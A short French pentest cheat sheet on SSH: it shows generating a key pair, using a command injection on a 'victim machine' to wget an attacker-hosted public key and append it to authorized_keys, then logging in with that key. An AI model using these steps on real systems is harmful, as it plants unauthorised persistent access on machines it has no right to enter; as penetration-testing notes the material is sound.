# ssh

* Créer une paire de clés SSH :

```
ssh-keygen -b 4096
```

* Importer une clé SSH sur un serveur avec une injection de commande (attention à l'encodage URL qui peut parfois être bloquant) :

```
wget http://<IP>:<PORT>/keys.pub -O /tmp/<FILE>
mkdir /home/<USER>/.ssh
cat /tmp/<FILE> >> ~/.ssh/authorized_keys
cat  ~/.ssh/authorized_keys
```

Si la machine d'attaque n'est pas joignable depuis la machine victime, il est possible de copier directement la clé publique sous le format texte (il n'y a pas d'encodage particulier dans ce genre de fichier).

* Réaliser une connexion avec une clé SSH :

```
ssh -i keys <USER>@<IP>
```
